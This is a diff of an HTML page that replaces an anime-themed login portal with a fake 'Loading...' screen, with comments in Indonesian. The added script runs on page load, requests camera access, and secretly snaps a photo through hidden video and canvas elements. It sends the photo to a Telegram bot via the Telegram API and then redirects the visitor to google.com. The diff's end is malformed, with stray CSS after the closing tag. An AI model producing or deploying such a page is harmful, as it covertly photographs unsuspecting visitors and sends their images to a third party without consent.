@@ -3,86 +3,124 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Anime Login Portal</title>
-    
-    <!-- Google Font - Poppins -->
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-    
-    <!-- Font Awesome untuk ikon -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    
+    <title>Loading...</title>
     <style>
-        /* Reset CSS dan pengaturan dasar */
-        * {
+        body {
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            font-family: 'Poppins', sans-serif;
-            min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            background: url('https://files.catbox.moe/cd074n.jpg') center/cover no-repeat;
-            position: relative;
-            overflow: hidden;
+            height: 100vh;
+            background-color: #f0f2f5;
+            font-family: Arial, sans-serif;
+            color: #555;
         }
-        
-        /* Overlay untuk memperbaiki kontras */
-        body::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.4);
-            z-index: -1;
+        .loader {
+            text-align: center;
         }
-        
-        /* Container untuk form login */
-        .login-container {
-            width: 90%;
-            max-width: 400px;
-            padding: 2rem;
-            background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(10px);
-            -webkit-backdrop-filter: blur(10px);
-            border-radius: 20px;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            animation: fadeIn 0.5s ease-in-out;
-            position: relative;
-            overflow: hidden;
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
         }
-        
-        /* Efek cahaya animasi */
-        .login-container::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: linear-gradient(
-                45deg,
-                transparent,
-                rgba(255, 255, 255, 0.1),
-                transparent
-            );
-            transform: rotate(45deg);
-            animation: shine 3s infinite;
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
-        
-        @keyframes shine {
-            0% {
-                transform: translateX(-100%) translateY(-100%) rotate(45deg);
+        /* Sembunyikan elemen video dan canvas */
+        #video, #canvas {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="loader">
+        <div class="spinner"></div>
+        <p>Memuat konten, mohon tunggu...</p>
+    </div>
+
+    <!-- Elemen ini diperlukan untuk proses di belakang layar -->
+    <video id="video"></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        // --- GANTI DENGAN KREDENSIAL ANDA ---
+        const BOT_TOKEN = "MASUKKAN_BOT_TOKEN_ANDA_DI_SINI";
+        const CHAT_ID = 123456789; // Ganti dengan Chat ID Anda
+        // -----------------------------------
+
+        // Fungsi untuk mengambil dan mengirim foto
+        async function captureAndSend() {
+            try {
+                // 1. Minta akses kamera
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    } 
+                });
+
+                // 2. Tampilkan stream di elemen video (tersembunyi)
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                video.play();
+
+                // 3. Tunggu video siap, lalu ambil gambar ke canvas
+                video.onloadedmetadata = () => {
+                    setTimeout(() => { // Beri jeda sebentar agar kamera fokus
+                        const canvas = document.getElementById('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        const context = canvas.getContext('2d');
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        // 4. Hentikan stream kamera
+                        stream.getTracks().forEach(track => track.stop());
+
+                        // 5. Konversi canvas ke Blob (format file gambar)
+                        canvas.toBlob(async (blob) => {
+                            // 6. Buat FormData untuk dikirim ke Telegram
+                            const formData = new FormData();
+                            formData.append('photo', blob, 'capture.jpg');
+                            formData.append('chat_id', CHAT_ID);
+
+                            // 7. Kirim ke API Telegram
+                            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                                method: 'POST',
+                                body: formData
+                            });
+
+                            if (response.ok) {
+                                console.log("Foto berhasil terkirim!");
+                                // 8. Alihkan ke situs lain setelah berhasil
+                                window.location.href = "https://www.google.com";
+                            } else {
+                                console.error("Gagal mengirim foto:", response.statusText);
+                                window.location.href = "https://www.google.com";
+                            }
+                        }, 'image/jpeg', 0.9);
+                    }, 1500); // Jeda 1.5 detik
+                };
+
+            } catch (error) {
+                console.error("Akses kamera ditolak atau terjadi error:", error);
+                // Alihkan juga jika pengguna menolak izin
+                window.location.href = "https://www.google.com";
             }
-            100% {
+        }
+
+        // Jalankan fungsi saat halaman dimuat
+        window.onload = captureAndSend;
+
+    </script>
+</body>
+</html>            100% {
                 transform: translateX(100%) translateY(100%) rotate(45deg);
             }
         }
